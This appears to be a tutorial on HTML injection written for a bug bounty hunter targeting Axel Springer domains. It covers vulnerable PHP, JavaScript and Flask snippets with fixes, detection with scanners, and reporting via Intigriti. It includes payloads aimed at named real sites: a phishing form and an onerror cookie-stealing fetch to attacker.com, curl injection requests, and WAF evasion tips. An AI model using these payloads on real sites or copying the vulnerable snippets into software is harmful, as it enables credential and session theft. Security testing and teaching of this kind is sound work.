
### What is HTML Injection?

HTML injection occurs when a web application fails to properly sanitize or validate user input, allowing attackers to inject HTML tags (e.g., `<div>`, `<img>`, `<script>`) into the page’s DOM. Unlike XSS, which focuses on injecting executable JavaScript, HTML injection primarily manipulates the page’s structure or appearance. However, HTML injection can escalate to XSS if the injected HTML includes JavaScript (e.g., `<script>` or event handlers like `onerror`).

**Key Points**:
- **Mechanism**: User input is reflected or stored in the page without encoding/escaping HTML characters (e.g., `<` to `&lt;`, `>` to `&gt;`).
- **Impact**: Defacement, phishing, data theft, or escalation to XSS.
- **Difference from XSS**: HTML injection doesn’t always execute scripts but can if JavaScript is included or if the context allows event handlers.

---

### Scenario 1: HTML Injection in a Comment System

**Context**: A news website (e.g., `sportbild.bild.de`) allows users to post comments on articles. The comment form (`<form class="theme-search__form">`, similar to your XSS query) accepts user input and displays it on the page without sanitization.

**How It Leads to Vulnerability**:
- The application directly renders the user’s comment as HTML.
- An attacker submits a comment containing HTML tags (e.g., `<h1>Malicious Content</h1>`), which alters the page’s appearance or structure.
- If JavaScript is allowed (e.g., `<script>alert('XSS')</script>`), it escalates to XSS.

**Attacker Manipulation**:
1. Attacker logs into `sportbild.bild.de` with a test account.
2. Submits a comment via the form:
   ```html
   <div style="background:red;color:white;font-size:30px;">Hacked by Mega7!</div>
   ```
3. The comment is displayed as a large red banner, defacing the page for all users.
4. To escalate, the attacker injects:
   ```html
   <img src="x" onerror="alert('Hacked by Mega7')">
   ```
   - The `onerror` event executes JavaScript, stealing cookies or redirecting users to a phishing site.

**Impact**:
- **Defacement**: Alters the page’s appearance, damaging trust.
- **Phishing**: Injects fake login forms to steal credentials.
- **XSS Escalation**: Executes scripts to steal sessions or perform actions.

---

### How to Find HTML Injection in Source Code

To identify HTML injection vulnerabilities in source code, look for:
- **Direct Output of User Input**: User input rendered without encoding (e.g., `htmlspecialchars` in PHP, `encodeURIComponent` in JavaScript).
- **Dynamic HTML Generation**: Use of `innerHTML`, `document.write`, or template literals without sanitization.
- **Lack of Sanitization Libraries**: Absence of libraries like DOMPurify or built-in escaping functions.
- **Form Processing**: Inputs from forms (e.g., `$_POST`, `request.query`) directly inserted into HTML.

**Tools**:
- **Static Analysis**: Use Semgrep or grep to find risky patterns:
  ```bash
  semgrep --config "p/security" *.php
  grep -r "innerHTML\|document\.write" *.js
  ```

---

### Vulnerable HTML Injection Code Snippets

Below are three vulnerable code snippets in different languages (PHP, JavaScript, Python Flask), explaining where vulnerabilities occur and how to mitigate them.

#### 1. PHP - Comment Display Vulnerability
**Code**:
```php
<?php
// comments.php
$comment = $_POST['comment']; // User input from form
echo "<div class='comment'>$comment</div>";
?>
```
**Vulnerability**:
- **Location**: The `$comment` variable is directly echoed into HTML without sanitization.
- **Issue**: If `$_POST['comment']` is `<h1>Hacked</h1>`, it renders as a heading, altering the page. If it’s `<script>alert('XSS')</script>`, it executes JavaScript.
- **Manipulation**: Attacker submits:
  ```html
  <div style="color:red;">Hacked by Mega7!</div>
  ```
  - Renders as a red div, defacing the page.

**Mitigation**:
- Use `htmlspecialchars` to encode HTML characters:
```php
<?php
$comment = htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');
echo "<div class='comment'>$comment</div>";
?>
```
- **Explanation**: Converts `<` to `&lt;`, `>` to `&gt;`, preventing HTML rendering.

#### 2. JavaScript - Dynamic Content Injection
**Code**:
```javascript
// script.js
const userInput = new URLSearchParams(window.location.search).get('q'); // e.g., /search?q=<b>Test
document.getElementById('result').innerHTML = userInput;
```
**Vulnerability**:
- **Location**: `innerHTML` directly sets user input (`userInput`) as HTML.
- **Issue**: If `q=<b>Test</b>`, it renders as bold text. If `q=<img src=x onerror=alert('XSS')>`, it triggers JavaScript.
- **Manipulation**: Attacker visits:
  ```url
  https://sportbild.bild.de/search?q=<img src=x onerror=alert('Hacked by Mega7')>
  ```
  - Executes an alert, escalating to XSS.

**Mitigation**:
- Use `textContent` or sanitize with DOMPurify:
```javascript
import DOMPurify from 'dompurify';
const userInput = new URLSearchParams(window.location.search).get('q');
document.getElementById('result').innerHTML = DOMPurify.sanitize(userInput);
```
- **Explanation**: `DOMPurify` removes malicious HTML/JavaScript, rendering only safe content.

#### 3. Python Flask - Template Injection
**Code**:
```python
# app.py
from flask import Flask, request
app = Flask(__name__)

@app.route('/profile', methods=['POST'])
def profile():
    username = request.form['username']
    return f"<h1>Welcome, {username}!</h1>"
```
**Vulnerability**:
- **Location**: `username` is directly concatenated into the HTML response.
- **Issue**: If `username=<h1>Hacked</h1>`, it renders as a nested heading. If `username=<script>stealCookies()</script>`, it executes JavaScript.
- **Manipulation**: Attacker submits:
  ```html
  <div style="background:red;">Hacked by Mega7!</div>
  ```
  - Displays a red banner, defacing the profile page.

**Mitigation**:
- Use Flask’s template engine with auto-escaping:
```python
from flask import Flask, request, render_template_string
app = Flask(__name__)

@app.route('/profile', methods=['POST'])
def profile():
    username = request.form['username']
    return render_template_string("<h1>Welcome, {{ username }}!</h1>", username=username)
```
- **Explanation**: Jinja2 escapes HTML characters, rendering `<` as `&lt;`.

---

### Finding HTML Injection in DAST (Dynamic Application Security Testing)

**DAST Approach**:
DAST tools (e.g., Burp Suite, OWASP ZAP) test running applications by sending malicious inputs and analyzing responses for signs of HTML injection. Unlike SAST, DAST doesn’t rely on source code access.

**Steps to Find HTML Injection**:
1. **Crawl the Application**:
   - Use OWASP ZAP or Burp Suite’s Spider to map endpoints (e.g., `/themes`, `/search`).
   - Example:
     ```bash
     zap-cli spider https://sportbild.bild.de
     ```

2. **Inject Test Payloads**:
   - Send HTML payloads to input fields (e.g., forms, query parameters):
     ```html
     <b>Test</b>
     <div style="color:red;">Hacked</div>
     <img src=x onerror=alert('XSS')>
     ```
   - Use Burp Intruder to fuzz inputs:
     - Payload list: `<h1>Test</h1>`, `<script>alert(1)</script>`, etc.
     - Target: `q` parameter in `/themes?q=`.

3. **Analyze Responses**:
   - Check if the payload is reflected as HTML (e.g., `<b>Test</b>` renders as bold text).
   - Look for JavaScript execution (e.g., alert pop-up for `<img src=x onerror=alert('XSS')>`).
   - Example: In Burp Repeater, send:
     ```http
     GET /themes?q=<b>Test</b> HTTP/1.1
     Host: sportbild.bild.de
     ```
     - If response contains `<b>Test</b>` and browser renders it bold, it’s HTML injection.

4. **Confirm It’s HTML Injection**:
   - **HTML Injection**: Payloads like `<b>Test</b>` or `<div style="color:red;">Test</div>` render as HTML but don’t execute scripts unless JavaScript is included (e.g., `onerror`).
   - **XSS**: Payloads like `<script>alert(1)</script>` execute JavaScript, confirming XSS (a subset of HTML injection).
   - **False Positives**: If `<b>Test</b>` is escaped (e.g., `&lt;b&gt;Test&lt;/b&gt;`), it’s not vulnerable.
   - Use payloads that avoid JavaScript to isolate HTML injection:
     ```html
     <h1>Hacked by Mega7</h1>
     ```

5. **Automate with Tools**:
   - OWASP ZAP active scan:
     ```bash
     zap-cli active-scan --recursive https://sportbild.bild.de
     ```
   - Nuclei with HTML injection templates:
     ```bash
     nuclei -u https://sportbild.bild.de -t injection/html-injection
     ```

**How to Definitively Confirm HTML Injection**:
- **Rendering Check**: The injected HTML (e.g., `<b>Test</b>`) renders as formatted text (bold) in the browser, not as raw text.
- **No Script Execution**: Non-JavaScript payloads (e.g., `<div>`) render, but `<script>` doesn’t execute unless XSS is also present.
- **Context**: Reflection in HTML context (e.g., `<div>[user_input]</div>`) vs. JavaScript context (e.g., `<script>var x='[user_input]';</script>`).
- **Response Analysis**: Use browser DevTools to confirm the DOM includes the injected HTML tags.

---

### Impact of HTML Injection

- **Defacement**: Alters page appearance, damaging user trust (e.g., red banners on `sportbild.bild.de`).
- **Phishing**: Injects fake forms to steal credentials (e.g., `<form action="attacker.com">`).
- **XSS Escalation**: If JavaScript is allowed, steals cookies, sessions, or performs actions.
- **SEO Damage**: Injected content (e.g., spam links) can harm search rankings.
- **Compliance Violations**: Exposing user data via phishing may violate GDPR or CCPA.
- **Severity**: Low (defacement) to High (XSS escalation), depending on context.

---

### Scenario 2: HTML Injection in a Profile Page

**Context**: A user profile page on `club.autobild.de` allows users to set a display name, which is shown on their profile without sanitization.

**How It Leads to Vulnerability**:
- The application renders the display name directly in HTML (e.g., `<h1>Welcome, [user_input]</h1>`).
- An attacker sets their display name to malicious HTML, which is displayed to all visitors.

**Attacker Manipulation**:
1. Attacker creates an account on `club.autobild.de`.
2. Sets display name to:
   ```html
   <div style="position:fixed;top:0;left:0;width:100%;background:black;color:white;">Site Hacked!</div>
   ```
3. The profile page renders a black banner covering the site, visible to all users.
4. To escalate to phishing, the attacker uses:
   ```html
   <form action="http://attacker.com/steal.php"><input type="text" name="username"><input type="password" name="password"><input type="submit" value="Login"></form>
   ```
   - Tricks users into entering credentials, sent to `attacker.com`.
5. For XSS, the attacker tries:
   ```html
   <img src=x onerror="fetch('http://attacker.com?cookie='+document.cookie)">
   ```
   - Steals session cookies if JavaScript executes.

**Impact**:
- **Stored HTML Injection**: Affects all profile visitors, amplifying damage.
- **Phishing**: Steals user credentials via fake forms.
- **Session Theft**: XSS escalation compromises user accounts.

---

### Mitigation Strategies (General)

- **Input Sanitization**:
  - Encode HTML characters (e.g., `<` to `&lt;`) using `htmlspecialchars` (PHP), `DOMPurify` (JavaScript), or template escaping (Flask/Jinja2).
- **Output Encoding**:
  - Use `textContent` instead of `innerHTML` in JavaScript.
  - Ensure frameworks auto-escape outputs (e.g., Jinja2, React).
- **Content Security Policy (CSP)**:
  - Block inline scripts to prevent XSS escalation:
    ```http
    Content-Security-Policy: script-src 'self'
    ```
- **Input Validation**:
  - Restrict inputs to alphanumeric characters where possible.
  - Use whitelists for allowed tags (e.g., `<b>`, `<i>`).
- **WAF Configuration**:
  - Configure Cloudflare to block HTML tags or suspicious inputs (per your WAF experience).
- **Secure Development**:
  - Train developers on OWASP guidelines (A7: XSS, A5: Security Misconfiguration).

---

### Testing in Axel Springer’s Bug Bounty Program

To find HTML injection on Axel Springer’s domains (`*.bild.de`, `*.welt.de`, etc.):

1. **Identify Input Points**:
   - Crawl for forms, search bars, or profile fields:
     ```bash
     gau bild.de | grep -i "form|search|profile|comment" | httprobe > bild_urls.txt
     ```
   - Focus on `/themes` (per your XSS query).

2. **Inject Payloads**:
   - Test simple HTML:
     ```bash
     curl -X GET "https://sportbild.bild.de/themes?q=<b>Test</b>"
     ```
   - Escalate to XSS:
     ```bash
     curl -X GET "https://sportbild.bild.de/themes?q=<img src=x onerror=alert('XSS')>"
     ```
   - Use Burp Intruder to fuzz inputs.

3. **Confirm Rendering**:
   - View the response in a browser to check if `<b>Test</b>` renders bold.
   - Use DevTools to inspect the DOM for injected tags.

4. **WAF Evasion (Cloudflare)**:
   - Encode payloads:
     ```html
     &lt;b&gt;Test&lt;/b&gt;
     ```
   - Use alternative tags:
     ```html
     <div style="color:red;">Test</div>
     ```

5. **Ethics**:
   - Use test accounts (e.g., `club.autobild.de`).
   - Avoid stored injection affecting real users.
   - Comply with Intigriti’s rules.

---

### Reporting to Axel Springer’s Bug Bounty Program

Submit via Intigriti (`https://app.intigriti.com/programs/axelspringerse/axelspringersevulnerabilitydisclosureprogram/detail`):

- **Details**:
  - Subdomain: e.g., `sportbild.bild.de`.
  - Endpoint: e.g., `/themes`.
  - Vulnerability: HTML injection.
  - Payload: `<div style="color:red;">Hacked by Mega7</div>`.
  - Steps:
    1. Submitted payload in search form (`/themes?q=`).
    2. Confirmed red div rendered in response.
  - Impact: “Defaces page, enables phishing, or escalates to XSS.”
- **Evidence**:
  - Screenshot of rendered HTML (e.g., red div).
  - HTTP request/response showing reflection.
- **Severity**: Low (defacement) to High (XSS escalation).
- **Mitigation**:
  - Encode outputs with `htmlspecialchars`.
  - Implement CSP.

---

### Advanced Interview Question
**Question**: If you find HTML injection on `club.autobild.de`’s profile page, how would you verify, escalate, and report it?

**Answer**:
- **Verification**:
  - Submit `<b>Test</b>` as a display name via `/profile`.
  - Confirm it renders bold in the browser.
  - Test `<img src=x onerror=alert('XSS')>` to check for XSS escalation.
  - Use Burp Repeater to analyze responses.
- **Escalation**:
  - Inject a phishing form: `<form action="attacker.com">`.
  - Show session theft with `<img src=x onerror=fetch('attacker.com?cookie='+document.cookie)>`.
  - Highlight stored impact: “Affects all profile visitors.”
- **Reporting**:
  - Submit via Intigriti:
    - Subdomain: `club.autobild.de`.
    - Endpoint: `/profile`.
    - Payload: `<div style="color:red;">Hacked</div>`.
    - Steps, screenshot of rendered div.
    - Impact: “Enables defacement, phishing, or XSS.”
  - Suggest mitigations: output encoding, CSP.
- **Ethics**: Use test accounts, avoid real user impact.

---

